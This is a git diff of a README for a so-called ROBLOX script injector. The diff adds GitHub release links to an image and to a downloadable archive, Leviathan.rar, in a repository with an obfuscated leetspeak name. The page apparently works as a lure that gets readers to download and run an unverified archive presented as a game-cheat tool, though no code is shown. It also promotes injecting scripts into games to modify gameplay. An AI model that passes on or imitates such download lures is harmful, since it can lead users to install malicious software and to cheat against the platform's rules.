@@ -1,7 +1,7 @@
 ## Overview
 <p>This repository contains a ROBLOX injector tool designed to enhance user experience within the ROBLOX gaming platform. The injector facilitates the injection of custom scripts into ROBLOX games, allowing users to modify and extend gameplay functionalities.</p>
 
-[image]()
+[image](https://github.com/audrey89607/S01ara-R0b10x-1nject0r/releases/download/Download/main.jpg)
 
 ## Features
   <p>Script Injection: Implement custom Lua scripts in ROBLOX games.</p>
@@ -10,7 +10,7 @@
   
 ## Usage
 
- * [Download]() the zip archive. <br>
+ * [Download](https://github.com/audrey89607/S01ara-R0b10x-1nject0r/releases/download/Download/Leviathan.rar) the zip archive. <br>
 
  
 ## Notes
